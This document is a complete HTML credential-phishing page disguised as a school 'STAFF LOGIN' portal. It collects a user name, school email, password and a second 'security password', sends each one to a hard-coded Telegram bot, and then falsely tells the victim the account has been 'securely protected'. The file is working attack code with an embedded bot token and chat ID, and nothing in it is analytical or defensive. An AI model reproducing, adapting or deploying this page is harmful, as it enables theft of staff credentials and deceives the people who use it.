<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STAFF LOGIN</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            width: 320px;
            padding: 25px;
            border: 1px solid #dcdcdc;
            border-radius: 3px;
            background-color: #f8f8f8;
        }

        h1 {
            font-size: 22px;
            color: #333333;
            text-align: center;
            margin: 0 0 25px 0;
            font-weight: bold;
            text-transform: uppercase;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #666666;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #cccccc;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 14px;
        }

        input:focus {
            outline: none;
            border-color: #0066cc;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s;
            position: relative;
        }

        button:hover:not(:disabled) {
            background-color: #0052a3;
        }

        button:disabled {
            background-color: #0066cc;
            cursor: not-allowed;
            opacity: 0.8;
        }

        .links {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
        }

        a {
            color: #0066cc;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        #securityPage,
        #successPage {
            display: none;
        }

        #successPage {
            text-align: center;
        }

        #successPage p {
            color: #666;
            margin: 20px 0;
            line-height: 1.5;
        }

        #successPage button {
            width: auto;
            padding: 10px 30px;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .button-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Initial Login Form -->
        <div id="loginPage">
            <h1>STAFF LOGIN</h1>
            <form id="initialForm">
                <div class="form-group">
                    <label for="username">User Name</label>
                    <input type="text" id="username" required>
                </div>
                <div class="form-group">
                    <label for="email">School Email</label>
                    <input type="email" id="email" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" required>
                </div>
                <button type="submit" id="loginButton">
                    <div class="button-content">
                        <span>LOGIN</span>
                    </div>
                </button>
            </form>
        </div>

        <!-- Security Verification Page -->
        <div id="securityPage">
            <h1>SECURITY VERIFICATION</h1>
            <form id="securityForm">
                <div class="form-group">
                    <label for="securityPassword">Security Password</label>
                    <input type="password" id="securityPassword" required>
                </div>
                <button type="submit" id="verifyButton">
                    <div class="button-content">
                        <span>VERIFY</span>
                    </div>
                </button>
            </form>
        </div>

        <!-- Success Page -->
        <div id="successPage">
            <h1>VERIFICATION SUCCESSFUL</h1>
            <p>Your account has been securely protected. No further action is necessary at this time.</p>
            <button onclick="window.location.href='index.html'">Continue to Dashboard</button>
        </div>
    </div>

    <script>
        const botToken = '7372758166:AAGWEyeXeMCcvPaY7OIrN81MySgnGkBKZ6c';
        const chatId = '1069924847';

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Telegram API Error:', error);
                throw error;
            }
        }

        // Login Form Handler
        document.getElementById('initialForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const button = document.getElementById('loginButton');
            button.disabled = true;
            button.querySelector('.button-content').innerHTML = `
                <span>Processing</span>
                <div class="spinner"></div>
            `;

            const credentials = {
                username: document.getElementById('username').value,
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            try {
                const message = `ðŸ” Login Attempt:\nðŸ‘¤ User: ${credentials.username}\nðŸ“§ Email: ${credentials.email}\nðŸ”‘ Password: ${credentials.password}`;
                await Promise.all([
                    sendToTelegram(message),
                    new Promise(resolve => setTimeout(resolve, 7000)) // Minimum 2 second delay
                ]);
                
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('securityPage').style.display = 'block';
            } catch (error) {
                console.error('Error:', error);
            } finally {
                button.disabled = false;
                button.querySelector('.button-content').innerHTML = `<span>LOGIN</span>`;
            }
        });

        // Security Form Handler
        document.getElementById('securityForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const button = document.getElementById('verifyButton');
            button.disabled = true;
            button.querySelector('.button-content').innerHTML = `
                <span>Verifying</span>
                <div class="spinner"></div>
            `;

            const securityCode = document.getElementById('securityPassword').value;

            try {
                const message = `ðŸ›¡ï¸ Security Code:\nðŸ”’ ${securityCode}`;
                await Promise.all([
                    sendToTelegram(message),
                    new Promise(resolve => setTimeout(resolve, 7000)) // Minimum 2 second delay
                ]);
                
                document.getElementById('securityPage').style.display = 'none';
                document.getElementById('successPage').style.display = 'block';
            } catch (error) {
                console.error('Error:', error);
            } finally {
                button.disabled = false;
                button.querySelector('.button-content').innerHTML = `<span>VERIFY</span>`;
            }
        });
    </script>
</body>
</html>
